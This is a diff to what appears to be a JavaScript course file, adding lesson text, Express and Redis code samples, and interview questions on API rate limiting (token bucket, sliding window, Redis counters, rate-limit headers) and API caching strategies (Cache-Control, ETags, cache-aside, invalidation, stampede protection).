+✅ Fair per user
+✅ Can offer tiered limits (free: 100/hr, pro: 10000/hr)
+✅ No false positives from shared IPs
+
+Tiered limits:
+const limits = {
+  free: 100,
+  basic: 1000,
+  pro: 10000,
+  enterprise: 100000
+};
+
+const limit = limits[req.user.tier];</div>
+
+                            <h3>Per Endpoint</h3>
+                            <div class="code-block">Different limits for different endpoints
+
+Example:
+GET /users → 1000/hour (read, cheap)
+POST /users → 100/hour (write, expensive)
+POST /search → 10/hour (expensive query)
+
+app.get('/users', rateLimitMiddleware(1000, 3600), getUsers);
+app.post('/users', rateLimitMiddleware(100, 3600), createUser);
+app.post('/search', rateLimitMiddleware(10, 3600), search);
+
+Why different limits:
+- Read vs write (writes more expensive)
+- Computation cost (search needs more resources)
+- Abuse potential (login more sensitive)
+
+Real example - GitHub API:
+Search: 30/minute
+Core endpoints: 5000/hour
+GraphQL: 5000 points/hour (complex queries cost more points)</div>
+
+                            <h3>Global Limits</h3>
+                            <div class="code-block">Total limit across all users
+
+Use case: Protect database/infrastructure
+
+Example:
+- Database: max 1000 connections
+- Third-party API: 10000 requests/hour limit
+
+// Global rate limiter
+const globalLimit = new TokenBucket(10000, 2.78);  // ~10000/hour
+
+app.use(async (req, res, next) => {
+  if (!globalLimit.tryConsume(1)) {
+    return res.status(503).json({
+      error: 'Service temporarily unavailable',
+      retryAfter: 60
+    });
+  }
+
+  next();
+});
+
+Combine with per-user limits:
+1. Check per-user limit (fair distribution)
+2. Check global limit (protect infrastructure)
+3. If both pass, allow request</div>
+
+                            <h2>Rate Limit Response Headers</h2>
+
+                            <div class="code-block">Standard headers to communicate rate limit status
+
+X-RateLimit-Limit: 100
+→ Maximum requests per window
+
+X-RateLimit-Remaining: 37
+→ Requests remaining in current window
+
+X-RateLimit-Reset: 1673542800
+→ Unix timestamp when limit resets
+
+Example response:
+HTTP/1.1 200 OK
+X-RateLimit-Limit: 100
+X-RateLimit-Remaining: 37
+X-RateLimit-Reset: 1673542800
+Content-Type: application/json
+
+{"data": [...]}
+
+When rate limited:
+HTTP/1.1 429 Too Many Requests
+X-RateLimit-Limit: 100
+X-RateLimit-Remaining: 0
+X-RateLimit-Reset: 1673542800
+Retry-After: 3600
+
+{
+  "error": "Rate limit exceeded",
+  "message": "Too many requests, please try again later"
+}
+
+Retry-After header:
+- Seconds until client can retry
+- Or HTTP date format
+
+Clients can use these headers to:
+✅ Show user their quota
+✅ Implement exponential backoff
+✅ Pause requests until reset</div>
+
+                            <h2>Distributed Rate Limiting with Redis</h2>
+
+                            <h3>Why Redis?</h3>
+                            <div class="code-block">Problem: Multiple API servers need shared rate limit
+
+Server 1: User makes 50 requests
+Server 2: User makes 50 requests
+→ Total: 100 requests (should be limited)
+
+But each server only knows about its own requests!
+
+Solution: Centralized rate limit storage in Redis
+
+    ┌─────────┐
+    │ Redis   │ ← Single source of truth
+    └────┬────┘
+         │
+    ┌────┴────┐
+    ↓         ↓
+ Server 1   Server 2
+  (50 req)  (50 req)
+    ↓         ↓
+  Both check same Redis counter
+  → Correct total: 100 requests</div>
+
+                            <h3>Redis Rate Limiting Implementation</h3>
+                            <div class="code-block">// Using Redis INCR for fixed window
+const Redis = require('ioredis');
+const redis = new Redis();
+
+async function rateLimit(userId, limit, windowSeconds) {
+  const key = \`ratelimit:\${userId}:\${Math.floor(Date.now() / (windowSeconds * 1000))}\`;
+
+  // Atomic increment
+  const current = await redis.incr(key);
+
+  // Set expiration on first request
+  if (current === 1) {
+    await redis.expire(key, windowSeconds);
+  }
+
+  const ttl = await redis.ttl(key);
+  const resetAt = Date.now() + (ttl * 1000);
+
+  return {
+    allowed: current <= limit,
+    limit,
+    remaining: Math.max(0, limit - current),
+    resetAt
+  };
+}
+
+// Middleware
+app.use(async (req, res, next) => {
+  const result = await rateLimit(req.user.id, 100, 3600);
+
+  res.set('X-RateLimit-Limit', result.limit);
+  res.set('X-RateLimit-Remaining', result.remaining);
+  res.set('X-RateLimit-Reset', result.resetAt);
+
+  if (!result.allowed) {
+    return res.status(429).json({
+      error: 'Rate limit exceeded',
+      retryAfter: Math.ceil((result.resetAt - Date.now()) / 1000)
+    });
+  }
+
+  next();
+});</div>
+
+                            <h3>Redis Sliding Window with Sorted Sets</h3>
+                            <div class="code-block">// More accurate sliding window using ZSET
+async function slidingWindowLog(userId, limit, windowMs) {
+  const key = \`ratelimit:\${userId}\`;
+  const now = Date.now();
+  const windowStart = now - windowMs;
+
+  // Pipeline for atomicity
+  const pipeline = redis.pipeline();
+
+  // Remove old entries
+  pipeline.zremrangebyscore(key, 0, windowStart);
+
+  // Count entries in window
+  pipeline.zcard(key);
+
+  // Add current request
+  pipeline.zadd(key, now, \`\${now}-\${Math.random()}\`);
+
+  // Set expiration
+  pipeline.expire(key, Math.ceil(windowMs / 1000));
+
+  const results = await pipeline.exec();
+  const count = results[1][1];  // Result of ZCARD
+
+  return {
+    allowed: count < limit,
+    limit,
+    remaining: Math.max(0, limit - count - 1)
+  };
+}</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>GitHub API Rate Limits</h3>
+                            <div class="code-block">Unauthenticated requests:
+- 60 requests per hour per IP
+
+Authenticated (OAuth or Personal Access Token):
+- 5,000 requests per hour per user
+
+GraphQL API:
+- 5,000 points per hour
+- Simple query: 1 point
+- Complex query: up to 1000 points
+
+Response headers:
+X-RateLimit-Limit: 5000
+X-RateLimit-Remaining: 4999
+X-RateLimit-Reset: 1673542800
+
+// Check rate limit without making request
+GET /rate_limit
+
+{
+  "rate": {
+    "limit": 5000,
+    "remaining": 4999,
+    "reset": 1673542800
+  }
+}</div>
+
+                            <h3>Twitter API Rate Limits</h3>
+                            <div class="code-block">Per-endpoint limits (15-minute windows)
+
+GET /2/tweets/search/recent: 450/15min (app), 180/15min (user)
+GET /2/users/by/username/:username: 300/15min
+POST /2/tweets: 200/15min
+
+Rate limit exceeded response:
+HTTP/1.1 429 Too Many Requests
+{
+  "title": "Too Many Requests",
+  "detail": "Too Many Requests",
+  "type": "about:blank",
+  "status": 429
+}
+
+Best practice: Respect limits, implement exponential backoff</div>
+
+                            <h3>Stripe API Rate Limits</h3>
+                            <div class="code-block">Adaptive rate limiting (not hard limit)
+
+Normal usage: No limits
+Sudden spike: Temporarily rate limited
+
+Response:
+HTTP/1.1 429 Too Many Requests
+{
+  "error": {
+    "message": "Too many requests",
+    "type": "rate_limit_error"
+  }
+}
+
+Strategy: Exponential backoff with jitter
+1st retry: Wait 1 second
+2nd retry: Wait 2 seconds
+3rd retry: Wait 4 seconds
+etc.</div>
+
+                            <h2>Summary</h2>
+                            <p>Rate limiting is essential for protecting APIs and ensuring fair access:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>GitHub rate limits (5000/hour authenticated)</li>
-                                <li>Twitter rate limits</li>
-                                <li>Token bucket algorithm visualization</li>
-                                <li>Redis INCR for rate limiting</li>
+                                <li><strong>Token Bucket:</strong> Allows bursts, good for spiky traffic</li>
+                                <li><strong>Leaky Bucket:</strong> Constant rate, smooths traffic</li>
+                                <li><strong>Fixed Window:</strong> Simple but has boundary problem</li>
+                                <li><strong>Sliding Window:</strong> Best balance of accuracy and simplicity</li>
+                                <li><strong>Sliding Window Log:</strong> Most accurate but memory expensive</li>
+                                <li>Use Redis for distributed rate limiting across multiple servers</li>
+                                <li>Return standard headers: X-RateLimit-Limit, X-RateLimit-Remaining, X-RateLimit-Reset</li>
+                                <li>Combine multiple dimensions: per-user, per-endpoint, global limits</li>
+                                <li>GitHub uses sliding window (5000/hour), Twitter uses per-endpoint limits</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What's the difference between Token Bucket and Leaky Bucket algorithms?",
+                                answer: "Token Bucket: Bucket holds tokens that refill at constant rate. Requests consume tokens. Allows bursts (if bucket full, can use all tokens immediately). Good for APIs with occasional spikes. Example: 100 capacity, refill 10/sec → can burst 100 requests instantly if idle. Leaky Bucket: Requests enter bucket, leak out at constant rate. No bursts allowed, always constant output rate. Good for upstream rate limits or when predictable load needed. Token Bucket = input rate varies, Leaky Bucket = output rate constant. Most APIs use Token Bucket for flexibility."
+                            },
+                            {
+                                question: "What is the boundary problem with Fixed Window rate limiting and how does Sliding Window solve it?",
+                                answer: "Fixed Window boundary problem: Window resets at fixed time, allowing burst at edges. Example: 100 req/hour, at 00:59:30 send 50 requests, at 01:00:01 send 50 more → 100 requests in 31 seconds (should be limited!). Sliding Window solution: Uses weighted calculation from previous and current window. At 00:30: weight 50% from previous window + current window requests. Smooths the boundary. Example: previous=80, current=40, position=50% → estimate = (80*0.5) + 40 = 80 total. No sudden reset, more accurate. GitHub uses Sliding Window for 5000/hour limit."
+                            },
+                            {
+                                question: "Why use Redis for rate limiting in a distributed system with multiple API servers?",
+                                answer: "Problem: Multiple servers don't share state. User sends 50 requests to Server1 (allowed), 50 to Server2 (allowed) → total 100 requests but limit is 60! Each server only knows its own count. Solution: Redis as centralized storage. Both servers check same Redis counter using INCR command (atomic). Now both servers see total count. Redis provides: 1) Atomic operations (INCR), 2) Expiration (TTL), 3) Fast (in-memory), 4) Distributed (all servers access same data). Implementation: Key = ratelimit:user123:window, INCR increments, check if exceeds limit. Essential for horizontal scaling."
+                            },
+                            {
+                                question: "What are the standard rate limit response headers and what is each used for?",
+                                answer: "X-RateLimit-Limit: Maximum requests allowed per window (e.g., 100). X-RateLimit-Remaining: Requests left in current window (e.g., 37). X-RateLimit-Reset: Unix timestamp when limit resets (e.g., 1673542800). Retry-After: Seconds until client can retry (on 429 response). Usage: Client can show user their quota, implement smart retry logic, pause requests when limit reached instead of getting 429 errors. Good API citizenship: check headers before making more requests. Example: If Remaining=0, wait until Reset time instead of hammering API."
+                            },
+                            {
+                                question: "How do you implement different rate limits for different API endpoints?",
+                                answer: "Different endpoints have different costs and abuse potential. Read operations cheaper than writes, search expensive, login sensitive. Implementation: Per-endpoint middleware with different limits. Example: GET /users → rateLimitMiddleware(1000, 3600) // 1000/hour, POST /users → rateLimitMiddleware(100, 3600) // 100/hour, POST /search → rateLimitMiddleware(10, 3600) // 10/hour. GitHub example: Core API 5000/hour, Search 30/minute, GraphQL uses point system (complex queries cost more points). Allows optimizing for cost and abuse prevention per endpoint."
+                            },
+                            {
+                                question: "What is the Sliding Window Log algorithm and when would you use it despite its higher memory cost?",
+                                answer: "Sliding Window Log stores timestamp of every request in sorted set or list. To check rate limit: remove timestamps older than window, count remaining, if count < limit allow. Most accurate algorithm, no approximation. Memory cost: Store every timestamp → 100 req/hour * 1M users * 8 bytes = 800MB! Also slower (must clean old entries). Use when: 1) Premium tier needing strict guarantees, 2) Exact fairness required (SLA commitments), 3) Low traffic endpoints where memory acceptable, 4) Legal/compliance requires exact counting. Most APIs use Sliding Window (approximate) instead for better memory/performance trade-off."
+                            }
+                        ]
                     },
                     {
                         id: 'caching-strategies',
                         title: 'API Caching Strategies',
                         duration: '50 min',
                         content: `
-                            <h2>OUTLINE: Caching</h2>
+                            <h2>Why Caching?</h2>
+                            <p>Caching stores copies of data closer to the client to improve performance and reduce load on backend systems.</p>
 
-                            <h3>Topics to Cover:</h3>
-                            <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li><strong>Caching Layers</strong>
-                                    - Client-side (browser cache)
-                                    - CDN/Edge caching
-                                    - API gateway cache
-                                    - Application cache (Redis, Memcached)
-                                    - Database query cache
-                                </li>
-                                <li><strong>HTTP Cache Headers</strong>
-                                    - Cache-Control directives
-                                    - ETag and If-None-Match
-                                    - Last-Modified and If-Modified-Since
-                                    - Vary header
-                                </li>
-                                <li><strong>Cache Invalidation</strong>
-                                    - Time-based expiration
-                                    - Manual purging
-                                    - Cache tags
-                                    - Surrogate keys
-                                </li>
-                                <li><strong>Caching Strategies</strong>
-                                    - Cache-aside (lazy loading)
-                                    - Write-through
-                                    - Write-behind
-                                    - Refresh-ahead
-                                </li>
-                                <li><strong>What to Cache</strong>
-                                    - Static data (rarely changes)
-                                    - Expensive computations
-                                    - External API responses
-                                    - What NOT to cache (personalized, real-time)
-                                </li>
-                            </ul>
+                            <div class="code-block">Without caching:
+Every request → Database query → Process → Response
+100 users request same data → 100 database queries
 
-                            <h3>Examples to Include:</h3>
+With caching:
+First request → Database → Cache result
+Next 99 requests → Read from cache (fast!)
+
+Benefits:
+✅ Faster response times (ms vs seconds)
+✅ Reduced database load (fewer queries)
+✅ Lower costs (less compute/bandwidth)
+✅ Better scalability (handle more traffic)
+✅ Improved availability (serve from cache if DB down)
+
+Example impact:
+Database query: 50ms
+Cache read: 1ms
+→ 50x faster!</div>
+
+                            <h2>Caching Layers</h2>
+
+                            <h3>1. Browser Cache (Client-Side)</h3>
+                            <div class="code-block">Browser stores responses locally
+
+Benefits:
+✅ Fastest (no network request!)
+✅ Works offline
+✅ Reduces bandwidth
+
+Controlled by HTTP headers:
+Cache-Control: max-age=3600
+
+GET /api/users
+← Response with Cache-Control: max-age=3600
+
+Browser stores for 1 hour
+Next GET /api/users → Served from browser cache (0 network requests!)
+
+Use for:
+- Static data (countries list)
+- Infrequently changing data (user profile)
+- Public data
+
+Don't use for:
+- Personalized data (different per user)
+- Real-time data (stock prices)
+- Sensitive data (might leak to others on shared computer)</div>
+
+                            <h3>2. CDN/Edge Cache</h3>
+                            <div class="code-block">Content Delivery Network caches at edge locations worldwide
+
+User in Tokyo requests data
+Without CDN: Request → US server (200ms latency)
+With CDN: Request → Tokyo edge (10ms latency)
+
+    User (Tokyo)
+         ↓ 10ms
+    CDN Edge (Tokyo)  ← Cache hit!
+         ↓ (cache miss: 200ms to origin)
+    Origin Server (US)
+
+Popular CDNs:
+- CloudFront (AWS)
+- Cloudflare
+- Fastly
+- Akamai
+
+Headers for CDN:
+Cache-Control: public, max-age=3600
+→ CDN caches for 1 hour
+
+Use for:
+- Public APIs
+- Static assets
+- High-traffic endpoints
+
+Benefits:
+✅ Global distribution
+✅ Reduced origin load
+✅ DDoS protection
+✅ Automatic scaling</div>
+
+                            <h3>3. API Gateway Cache</h3>
+                            <div class="code-block">Cache at API gateway layer
+
+Client → API Gateway (cached!) → Backend
+
+AWS API Gateway example:
+Enable caching: 0.5GB to 237GB cache
+TTL: 300 seconds (default)
+Cache key: URL + query parameters
+
+Benefits:
+✅ Centralized cache management
+✅ Protects backend from traffic spikes
+✅ Easy to configure
+
+Use for:
+- Read-heavy APIs
+- Public endpoints
+- Aggregated data</div>
+
+                            <h3>4. Application Cache (Redis/Memcached)</h3>
+                            <div class="code-block">Most common and flexible caching layer
+
+Application → Redis → Database
+
+Redis example:
+// Check cache first
+const cached = await redis.get('user:123');
+if (cached) {
+  return JSON.parse(cached);  // Cache hit!
+}
+
+// Cache miss, query database
+const user = await db.query('SELECT * FROM users WHERE id = 123');
+
+// Store in cache
+await redis.setex('user:123', 3600, JSON.stringify(user));
+
+return user;
+
+Benefits:
+✅ Full control over caching logic
+✅ Fast (in-memory)
+✅ Flexible (cache any data structure)
+✅ Distributed (multiple app servers share cache)
+
+Redis vs Memcached:
+Redis: Richer data structures (lists, sets, hashes), persistence
+Memcached: Simpler, slightly faster for simple key-value</div>
+
+                            <h3>5. Database Query Cache</h3>
+                            <div class="code-block">Database caches query results
+
+MySQL query cache (deprecated in MySQL 8.0):
+SELECT * FROM users WHERE id = 123;
+→ Database caches result
+
+Application-level query cache (better):
+// Cache entire query result
+const cacheKey = 'query:users:id:123';
+const result = await cache.get(cacheKey) || await db.query(...);
+
+Benefits:
+✅ Transparent to application
+❌ Limited control
+❌ Invalidation difficult
+
+Recommendation: Use application cache instead for better control</div>
+
+                            <h2>HTTP Cache Headers</h2>
+
+                            <h3>Cache-Control Directives</h3>
+                            <div class="code-block">Cache-Control: [directives]
+
+Common directives:
+
+public
+→ Any cache can store (CDN, proxies, browser)
+Use for: Public APIs, same response for all users
+
+private
+→ Only browser can cache (not CDN/proxies)
+Use for: User-specific data
+
+no-cache
+→ Must revalidate with server before using cache
+Not "don't cache"! Still caches but checks freshness
+
+no-store
+→ Don't cache at all
+Use for: Sensitive data (passwords, credit cards)
+
+max-age=3600
+→ Fresh for 3600 seconds (1 hour)
+After expiry, must revalidate
+
+s-maxage=7200
+→ Shared cache (CDN) max age
+Overrides max-age for CDNs
+
+must-revalidate
+→ Once stale, must revalidate (no stale-if-error)
+
+immutable
+→ Never changes (perfect for versioned assets)
+
+Examples:
+
+// Public API, cache 1 hour
+Cache-Control: public, max-age=3600
+
+// User-specific, cache 5 minutes in browser only
+Cache-Control: private, max-age=300
+
+// Sensitive data, don't cache
+Cache-Control: no-store
+
+// Static asset with version in URL, cache forever
+Cache-Control: public, max-age=31536000, immutable</div>
+
+                            <h3>ETag and Conditional Requests</h3>
+                            <div class="code-block">ETag: Version identifier for resource
+
+Flow:
+1. Client: GET /api/users/123
+2. Server: Returns data + ETag: "abc123"
+3. Client caches data and ETag
+4. Later: GET /api/users/123 + If-None-Match: "abc123"
+5. Server checks:
+   - If ETag still "abc123" → 304 Not Modified (no body)
+   - If ETag changed → 200 OK with new data + new ETag
+
+Benefits:
+✅ Saves bandwidth (304 has no body)
+✅ Server can validate freshness
+✅ Works even when max-age expired
+
+// Express implementation
+app.get('/api/users/:id', async (req, res) => {
+  const user = await db.getUser(req.params.id);
+
+  // Generate ETag (hash of content)
+  const etag = crypto
+    .createHash('md5')
+    .update(JSON.stringify(user))
+    .digest('hex');
+
+  // Check If-None-Match header
+  if (req.headers['if-none-match'] === etag) {
+    return res.status(304).end();  // Not modified
+  }
+
+  res.setHeader('ETag', etag);
+  res.setHeader('Cache-Control', 'private, max-age=300');
+  res.json(user);
+});
+
+GitHub API uses ETags:
+GET /repos/facebook/react
+ETag: "686897696a7c876b7e"
+
+Next request with If-None-Match:
+→ 304 Not Modified if unchanged
+→ 200 with new data if changed</div>
+
+                            <h3>Last-Modified and Conditional Requests</h3>
+                            <div class="code-block">Alternative to ETag using timestamps
+
+Flow:
+1. Server: Last-Modified: Wed, 15 Jan 2024 10:00:00 GMT
+2. Client caches data and timestamp
+3. Later: If-Modified-Since: Wed, 15 Jan 2024 10:00:00 GMT
+4. Server:
+   - If not modified → 304 Not Modified
+   - If modified → 200 OK with new data
+
+// Express implementation
+app.get('/api/posts/:id', async (req, res) => {
+  const post = await db.getPost(req.params.id);
+
+  const lastModified = post.updatedAt.toUTCString();
+  const ifModifiedSince = req.headers['if-modified-since'];
+
+  if (ifModifiedSince && ifModifiedSince === lastModified) {
+    return res.status(304).end();
+  }
+
+  res.setHeader('Last-Modified', lastModified);
+  res.setHeader('Cache-Control', 'public, max-age=600');
+  res.json(post);
+});
+
+ETag vs Last-Modified:
+ETag: More accurate (content-based), works when no timestamp
+Last-Modified: Simpler, requires update timestamp
+
+Can use both together!</div>
+
+                            <h3>Vary Header</h3>
+                            <div class="code-block">Tells caches to store separate versions based on request headers
+
+Vary: Accept-Encoding
+→ Store separate versions for gzip, brotli, uncompressed
+
+Vary: Accept-Language
+→ Separate cache per language (en, es, fr)
+
+Vary: Authorization
+→ Don't share cached response between users
+
+Example:
+GET /api/data
+Accept-Language: en
+← Response in English + Vary: Accept-Language
+
+GET /api/data
+Accept-Language: es
+← Response in Spanish (different cached version)
+
+// Express
+res.setHeader('Vary', 'Accept-Encoding, Accept-Language');
+
+Common issue: Missing Vary
+Cache returns English to Spanish user!
+→ Always include Vary when response differs by header</div>
+
+                            <h2>Caching Strategies</h2>
+
+                            <h3>1. Cache-Aside (Lazy Loading)</h3>
+                            <div class="code-block">Most common pattern: Load data into cache on-demand
+
+Flow:
+1. App checks cache
+2. Cache miss → Query database
+3. Store in cache
+4. Return data
+
+// Implementation
+async function getUser(userId) {
+  const cacheKey = \`user:\${userId}\`;
+
+  // Try cache first
+  let user = await redis.get(cacheKey);
+  if (user) {
+    return JSON.parse(user);  // Cache hit
+  }
+
+  // Cache miss, load from DB
+  user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
+
+  // Store in cache (TTL: 1 hour)
+  await redis.setex(cacheKey, 3600, JSON.stringify(user));
+
+  return user;
+}
+
+Pros:
+✅ Only caches data that's actually requested
+✅ Simple to implement
+✅ Cache resilient (if cache fails, app still works)
+
+Cons:
+❌ Cache miss penalty (slower first request)
+❌ Cache stampede risk (many requests miss simultaneously)
+
+Use for: General-purpose caching</div>
+
+                            <h3>2. Write-Through Cache</h3>
+                            <div class="code-block">Write to cache and database simultaneously
+
+Flow:
+1. App writes data
+2. Update database
+3. Update cache
+4. Return success
+
+// Implementation
+async function updateUser(userId, data) {
+  const cacheKey = \`user:\${userId}\`;
+
+  // Update database
+  await db.query('UPDATE users SET ... WHERE id = ?', [userId, data]);
+
+  // Update cache
+  await redis.setex(cacheKey, 3600, JSON.stringify(data));
+
+  return data;
+}
+
+Pros:
+✅ Cache always in sync with database
+✅ No cache misses on read (data pre-populated)
+
+Cons:
+❌ Slower writes (two operations)
+❌ Wasted cache space (writes that are never read)
+
+Use for: Read-heavy workloads where fresh data critical</div>
+
+                            <h3>3. Write-Behind (Write-Back)</h3>
+                            <div class="code-block">Write to cache immediately, database asynchronously
+
+Flow:
+1. App writes to cache
+2. Return success immediately
+3. Background job writes to database
+
+// Implementation
+async function updateUser(userId, data) {
+  const cacheKey = \`user:\${userId}\`;
+
+  // Write to cache immediately
+  await redis.setex(cacheKey, 3600, JSON.stringify(data));
+
+  // Queue database write
+  await queue.add('writeDatabase', { userId, data });
+
+  return data;
+}
+
+// Background worker
+queue.process('writeDatabase', async (job) => {
+  await db.query('UPDATE users SET ... WHERE id = ?', [job.data.userId, job.data.data]);
+});
+
+Pros:
+✅ Fast writes (no DB wait)
+✅ Batching possible (multiple writes → one DB call)
+
+Cons:
+❌ Data loss risk (if cache fails before DB write)
+❌ Complex to implement correctly
+
+Use for: Write-heavy workloads, analytics, logging</div>
+
+                            <h3>4. Refresh-Ahead</h3>
+                            <div class="code-block">Proactively refresh cache before expiration
+
+Flow:
+1. Cache entry about to expire (e.g., 90% of TTL passed)
+2. Background job refreshes from database
+3. Cache stays hot (no misses)
+
+// Implementation
+async function getUser(userId) {
+  const cacheKey = \`user:\${userId}\`;
+
+  let user = await redis.get(cacheKey);
+  const ttl = await redis.ttl(cacheKey);
+
+  // If TTL < 10% of original (3600s → 360s remaining)
+  if (ttl > 0 && ttl < 360) {
+    // Async refresh (don't wait)
+    refreshCache(userId).catch(err => console.error(err));
+  }
+
+  if (user) {
+    return JSON.parse(user);
+  }
+
+  // Cache miss, load from DB
+  user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
+  await redis.setex(cacheKey, 3600, JSON.stringify(user));
+
+  return user;
+}
+
+async function refreshCache(userId) {
+  const user = await db.query('SELECT * FROM users WHERE id = ?', [userId]);
+  await redis.setex(\`user:\${userId}\`, 3600, JSON.stringify(user));
+}
+
+Pros:
+✅ No cache misses (always fresh)
+✅ Consistent performance
+
+Cons:
+❌ Extra database load (refreshing unused entries)
+❌ More complex
+
+Use for: Critical data that must always be cached</div>
+
+                            <h2>Cache Invalidation</h2>
+                            <p>"There are only two hard things in Computer Science: cache invalidation and naming things." - Phil Karlton</p>
+
+                            <h3>1. Time-Based Expiration (TTL)</h3>
+                            <div class="code-block">Simplest: Cache expires after time period
+
+// Redis
+await redis.setex('user:123', 3600, data);  // Expires in 1 hour
+
+// HTTP
+Cache-Control: max-age=3600
+
+Pros:
+✅ Simple
+✅ Automatic cleanup
+
+Cons:
+❌ Stale data possible (until expiration)
+❌ All-or-nothing (can't selectively invalidate)
+
+Choosing TTL:
+- Frequently changing: Short TTL (60s)
+- Rarely changing: Long TTL (1 hour - 1 day)
+- Static: Very long TTL (1 week+)
+
+Balance: Freshness vs cache hit rate</div>
+
+                            <h3>2. Manual Invalidation</h3>
+                            <div class="code-block">Explicitly delete cache when data changes
+
+// When user updates profile
+async function updateUser(userId, data) {
+  await db.query('UPDATE users SET ... WHERE id = ?', [userId, data]);
+
+  // Invalidate cache
+  await redis.del(\`user:\${userId}\`);
+
+  return data;
+}
+
+// Next read will cache miss → load fresh data
+
+Pros:
+✅ Data always fresh after update
+✅ No stale data
+
+Cons:
+❌ Must remember to invalidate everywhere data changes
+❌ Easy to forget (leads to stale data)
+
+Best practice: Encapsulate in data access layer
+class UserRepository {
+  async update(userId, data) {
+    await db.update(userId, data);
+    await redis.del(\`user:\${userId}\`);  // Always invalidate
+  }
+}</div>
+
+                            <h3>3. Cache Tags</h3>
+                            <div class="code-block">Tag cache entries, invalidate by tag
+
+Example: Blog post has comments
+
+// Cache post with tags
+await redis.set('post:123', postData);
+await redis.sadd('tag:post:123', 'post:123');
+await redis.sadd('tag:user:456', 'post:123');  // Author
+
+// Cache comments
+await redis.set('comments:post:123', commentsData);
+await redis.sadd('tag:post:123', 'comments:post:123');
+
+// Invalidate all cache for post:123
+const keys = await redis.smembers('tag:post:123');
+await redis.del(...keys);  // Deletes post AND comments
+
+Pros:
+✅ Bulk invalidation
+✅ Related data invalidated together
+
+Cons:
+❌ More complex
+❌ Extra storage for tags
+
+Use for: Complex relationships</div>
+
+                            <h2>Common Caching Problems</h2>
+
+                            <h3>Cache Stampede (Thundering Herd)</h3>
+                            <div class="code-block">Problem: Many requests hit cache miss simultaneously
+
+Scenario:
+1. Popular cache entry expires
+2. 1000 concurrent requests
+3. All miss cache
+4. All query database simultaneously
+5. Database overwhelmed!
+
+Solution 1: Lock-based
+// First request gets lock, others wait
+const lock = await redis.setnx('lock:user:123', 1, { EX: 10 });
+if (lock) {
+  // This request refreshes cache
+  user = await db.query(...);
+  await redis.set('user:123', user);
+} else {
+  // Wait for first request to finish
+  await sleep(100);
+  user = await redis.get('user:123');
+}
+
+Solution 2: Probabilistic early expiration
+// Refresh before expiration with probability
+const ttl = await redis.ttl(cacheKey);
+const expiry = 3600;  // Original TTL
+const delta = expiry * 0.1;  // 10% window
+
+if (ttl < delta && Math.random() < 0.5) {
+  // Randomly refresh early
+  refreshCache();
+}
+
+Solution 3: Stale-while-revalidate
+// Serve stale data while refreshing
+if (ttl < 60 && !isRefreshing) {
+  refreshCache();  // Async
+  return staleData;  // Return immediately
+}</div>
+
+                            <h3>What to Cache</h3>
+                            <div class="code-block">✅ GOOD candidates:
+- Static data (countries, timezones)
+- Rarely changing data (user profiles)
+- Expensive computations (reports, analytics)
+- External API responses (third-party data)
+- Database query results (frequent reads)
+- Rendered pages/fragments
+
+❌ DON'T cache:
+- Personalized data (different per user)
+  Unless using per-user cache keys
+- Real-time data (stock prices, live scores)
+- Sensitive data (credit cards, passwords)
+- Frequently changing data (inventory counts)
+- Large objects (videos, large files)
+  Use CDN instead
+
+Example decision:
+User profile: ✅ Cache (changes rarely)
+Shopping cart: ❌ Don't cache (changes constantly)
+Product list: ✅ Cache (same for all users)
+Product details: ✅ Cache (rarely changes)
+Product inventory: ⚠️ Maybe (balance freshness vs performance)</div>
+
+                            <h2>Real-World Examples</h2>
+
+                            <h3>GitHub API ETag Usage</h3>
+                            <div class="code-block">// First request
+GET /repos/facebook/react
+ETag: "686897696a7c876b7e"
+Cache-Control: public, max-age=60
+
+// Subsequent request
+GET /repos/facebook/react
+If-None-Match: "686897696a7c876b7e"
+
+→ 304 Not Modified (if unchanged)
+→ Saves bandwidth and rate limit quota!
+
+GitHub rate limit:
+- Without ETag: Counts against quota
+- With ETag + 304: Doesn't count!
+
+Best practice: Always store and send ETags</div>
+
+                            <h3>Redis Caching Pattern</h3>
+                            <div class="code-block">// Express middleware for Redis caching
+function cacheMiddleware(ttl = 3600) {
+  return async (req, res, next) => {
+    // Only cache GET requests
+    if (req.method !== 'GET') {
+      return next();
+    }
+
+    const cacheKey = \`cache:\${req.originalUrl}\`;
+
+    try {
+      const cached = await redis.get(cacheKey);
+      if (cached) {
+        return res.json(JSON.parse(cached));
+      }
+
+      // Modify res.json to cache response
+      const originalJson = res.json.bind(res);
+      res.json = (data) => {
+        redis.setex(cacheKey, ttl, JSON.stringify(data));
+        return originalJson(data);
+      };
+
+      next();
+    } catch (err) {
+      next();  // Cache error, continue without cache
+    }
+  };
+}
+
+// Usage
+app.get('/api/products', cacheMiddleware(300), async (req, res) => {
+  const products = await db.getProducts();
+  res.json(products);  // Automatically cached
+});</div>
+
+                            <h2>Summary</h2>
+                            <p>Caching is essential for API performance and scalability:</p>
                             <ul style="margin: 1rem 0; margin-left: 2rem;">
-                                <li>CDN caching with CloudFront</li>
-                                <li>Redis caching patterns</li>
-                                <li>GitHub API ETag usage</li>
-                                <li>Cache stampede problem and solutions</li>
+                                <li><strong>Layers:</strong> Browser, CDN, API Gateway, Application (Redis), Database</li>
+                                <li><strong>Cache-Control:</strong> public/private, max-age, no-store for sensitive data</li>
+                                <li><strong>ETags:</strong> Conditional requests save bandwidth, GitHub doesn't count 304 against rate limit</li>
+                                <li><strong>Strategies:</strong> Cache-aside (most common), write-through (sync), write-behind (async), refresh-ahead (proactive)</li>
+                                <li><strong>Invalidation:</strong> TTL (simple), manual (on update), cache tags (bulk)</li>
+                                <li><strong>Cache stampede:</strong> Use locks, probabilistic early expiration, or stale-while-revalidate</li>
+                                <li>Cache static/expensive data, don't cache personalized/real-time/sensitive data</li>
+                                <li>Balance freshness vs performance when choosing TTL</li>
                             </ul>
                         `,
-                        interviews: []
+                        interviews: [
+                            {
+                                question: "What is the cache-aside pattern and when should you use it?",
+                                answer: "Cache-aside (lazy loading): App checks cache first, on miss queries database then stores result in cache. Flow: 1) Check cache, 2) Miss → query DB, 3) Store in cache, 4) Return data. Pros: Only caches requested data, simple, cache resilient (works if cache fails). Cons: First request slower (cache miss penalty), cache stampede risk if many requests miss together. Most common pattern for general-purpose caching. Use for: API endpoints with read-heavy traffic, expensive database queries. Example: User profiles, product details. Don't use for: Write-heavy workloads (better: write-through)."
+                            },
